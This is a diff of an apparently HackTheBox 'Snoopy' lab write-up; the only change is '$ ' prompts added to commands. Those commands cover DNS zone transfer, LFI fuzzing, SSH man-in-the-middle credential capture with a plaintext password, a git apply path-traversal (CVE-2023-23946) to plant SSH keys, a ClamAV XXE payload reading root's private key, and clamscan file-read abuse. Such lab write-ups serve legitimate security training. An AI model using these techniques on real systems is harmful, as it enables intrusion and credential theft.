@@ -22,8 +22,8 @@ The target was `10.10.11.212` (the notes captured one lab spin at `10.129.84.147
 I started with a full TCP sweep at a high packet rate, then a service/version scan on only the ports that answered.
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.212
-nmap -p 22,53,80 -sCV 10.10.11.212
+$ nmap -p- --min-rate 10000 10.10.11.212
+$ nmap -p 22,53,80 -sCV 10.10.11.212
 ```
 
 Three ports answered:
@@ -68,7 +68,7 @@ that our mailserver 'mail.snoopy.htb' is currently offline
 So there is a `mail.snoopy.htb` host that does not currently resolve. I confirmed the box agrees it is missing:
 
 ```bash
-dig any mail.snoopy.htb @10.10.11.212
+$ dig any mail.snoopy.htb @10.10.11.212
 ```
 
 ```
@@ -84,7 +84,7 @@ snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 ...
 Directory busting the web root found three paths, including a `/download` endpoint serving an 11 MB blob.
 
 ```bash
-feroxbuster -u http://snoopy.htb -x php,html -C 400,502 --no-recursion
+$ feroxbuster -u http://snoopy.htb -x php,html -C 400,502 --no-recursion
 ```
 
 ```
@@ -98,7 +98,7 @@ feroxbuster -u http://snoopy.htb -x php,html -C 400,502 --no-recursion
 Fuzzing virtual hosts turned up a Mattermost instance:
 
 ```bash
-ffuf -u http://10.10.11.212 -H "Host: FUZZ.snoopy.htb" \
+$ ffuf -u http://10.10.11.212 -H "Host: FUZZ.snoopy.htb" \
   -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
 ```
 
@@ -109,7 +109,7 @@ ffuf -u http://10.10.11.212 -H "Host: FUZZ.snoopy.htb" \
 With BIND authoritative for the zone, the first thing to try is an unrestricted AXFR. The named config later showed `allow-transfer { 10.0.0.0/8; }`, but the HTB VPN puts my tun0 inside that range, so the transfer worked:
 
 ```bash
-dig axfr snoopy.htb @10.10.11.212
+$ dig axfr snoopy.htb @10.10.11.212
 ```
 
 ```
@@ -132,7 +132,7 @@ The `172.18.0.0/16` addresses are Docker internal hosts: a Mattermost container 
 The `/download` endpoint takes a `file` parameter, which it normally uses to bundle a press file into a zip. I fuzzed it for traversal:
 
 ```bash
-ffuf -u "http://snoopy.htb/download?file=FUZZ" \
+$ ffuf -u "http://snoopy.htb/download?file=FUZZ" \
   -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac
 ```
 
@@ -243,7 +243,7 @@ zone "snoopy.htb" IN {
 I started a debug SMTP server to catch whatever Mattermost sends. Port `25` needs root to bind:
 
 ```bash
-sudo python3 -m smtpd -n -c DebuggingServer 10.10.16.4:25
+$ sudo python3 -m smtpd -n -c DebuggingServer 10.10.16.4:25
 ```
 
 (The newer equivalent is `sudo python3 -m aiosmtpd -n -l 10.10.16.4:25` since `smtpd` is deprecated; both just print the message body to the console.)
@@ -288,7 +288,7 @@ server ip: 10.10.16.4
 A plain listener only showed a paramiko SSH banner, no shell, no callback:
 
 ```bash
-rlwrap nc -lvnp 2222
+$ rlwrap nc -lvnp 2222
 ```
 
 ```
@@ -301,7 +301,7 @@ So the provisioning service SSHes outward to whatever address I hand it. I tried
 That client authenticates to me, which means if I terminate the SSH session at my end and proxy it onward to the real box, I read its credentials in the clear. I used `ssh-mitm` for exactly that, pointing `/server_provision` at my listener on `2222` and relaying to the box on `22`:
 
 ```bash
-python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222
+$ python3 -m sshmitm server --enable-trivial-auth --remote-host 10.10.11.212 --listen-port 2222
 ```
 
 `--enable-trivial-auth` lets the client through even though it cannot verify the host key, and the proxy logs the plaintext auth it relays to the real host. After re-running `/server_provision` against `10.10.16.4:2222`:
@@ -318,7 +318,7 @@ INFO got ssh command: ls -la
 The provisioning bot logs in as `cbrown` and even runs `ls -la`. Those creds work over real SSH:
 
 ```bash
-ssh cbrown@10.10.11.212
+$ ssh cbrown@10.10.11.212
 # sn00pedcr3dential!!!
 ```
 
@@ -329,7 +329,7 @@ ssh cbrown@10.10.11.212
 cbrown's sudo rule allowed running `git apply` as sbrown:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -342,12 +342,12 @@ User cbrown may run the following commands on snoopy:
 The intended route is CVE-2023-23946, a path-traversal in `git apply` where a patch first renames a tracked symlink and then writes a new file through the renamed path, so the write escapes the repo into wherever the symlink pointed. The setup builds a git repo whose tracked entry is a symlink to sbrown's `.ssh` directory:
 
 ```bash
-mkdir /dev/shm/ssh && cd /dev/shm/ssh
-git init
-ln -s /home/sbrown/.ssh symlink
-git add symlink
-git commit -m "add symlink"
-chmod 777 /dev/shm/ssh
+$ mkdir /dev/shm/ssh && cd /dev/shm/ssh
+$ git init
+$ ln -s /home/sbrown/.ssh symlink
+$ git add symlink
+$ git commit -m "add symlink"
+$ chmod 777 /dev/shm/ssh
 ```
 
 The patch renames `symlink` to `renamed-symlink`, then adds `authorized_keys` under it, which resolves to `/home/sbrown/.ssh/authorized_keys`:
@@ -368,24 +368,24 @@ index 0000000..039727e
 ```
 
 ```bash
-sudo -u sbrown /usr/bin/git apply -v patch
-ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
+$ sudo -u sbrown /usr/bin/git apply -v patch
+$ ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
 ```
 
 The simpler path, and the one I used, leans on the same fact that `git apply` runs as sbrown and that I can just hand it a normal diff that writes sbrown's `authorized_keys`. I generated a diff from cbrown's files, rewrote the paths to target sbrown's home, and inserted my public key:
 
 ```bash
-cd /home
-git diff cbrown/.bash_history cbrown/.ssh/authorized_keys > /tmp/diff
+$ cd /home
+$ git diff cbrown/.bash_history cbrown/.ssh/authorized_keys > /tmp/diff
 # edit /tmp/diff: rewrite every cbrown -> sbrown, drop my pubkey into the added authorized_keys hunk
-chmod 777 /home/cbrown
-sudo -u sbrown /usr/bin/git apply /tmp/diff
+$ chmod 777 /home/cbrown
+$ sudo -u sbrown /usr/bin/git apply /tmp/diff
 ```
 
 A post-patch git build also accepts `git apply --unsafe-paths --directory /home/sbrown/.ssh test.diff`, which writes the target file directly without the symlink rename. Either way I land an SSH key in sbrown's account and log in for the user flag:
 
 ```bash
-ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
+$ ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
 ```
 
 ### sbrown -> root via sudo clamscan
@@ -393,7 +393,7 @@ ssh -i ~/.ssh/id_ed25519 sbrown@10.10.11.212
 sbrown had a clean NOPASSWD rule for clamscan:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -404,23 +404,23 @@ User sbrown may run the following commands on snoopy:
 The intended root step is CVE-2023-20052, an XXE in ClamAV's DMG file parser. A crafted DMG with a plist external entity pointing at a target file leaks that file into `clamscan --debug` output. The public PoC builds the malicious image in a container:
 
 ```bash
-git clone https://github.com/nokn0wthing/CVE-2023-20052.git
-cd CVE-2023-20052 && docker build -t cve-2023-20052 .
-docker run -v $(pwd):/exploit -it cve-2023-20052 bash
+$ git clone https://github.com/nokn0wthing/CVE-2023-20052.git
+$ cd CVE-2023-20052 && docker build -t cve-2023-20052 .
+$ docker run -v $(pwd):/exploit -it cve-2023-20052 bash
 # inside: genisoimage -> dmg, then inject the entity
 #   <!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa">]>
 #   ... &xxe; into a blkx block
 ```
 
 ```bash
-sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg | grep "text value"
+$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg | grep "text value"
 # leaks root's private key out of the debug parser output
 ```
 
 The unintended path, which I took, is the `-f` flag. `clamscan -f <file>` treats the file as a list of paths to scan, and it echoes each line it reads back into its own output as a "No such file or directory" entry. That turns it into an arbitrary root file read:
 
 ```bash
-sudo /usr/local/bin/clamscan -f /root/root.txt
+$ sudo /usr/local/bin/clamscan -f /root/root.txt
 ```
 
 ```
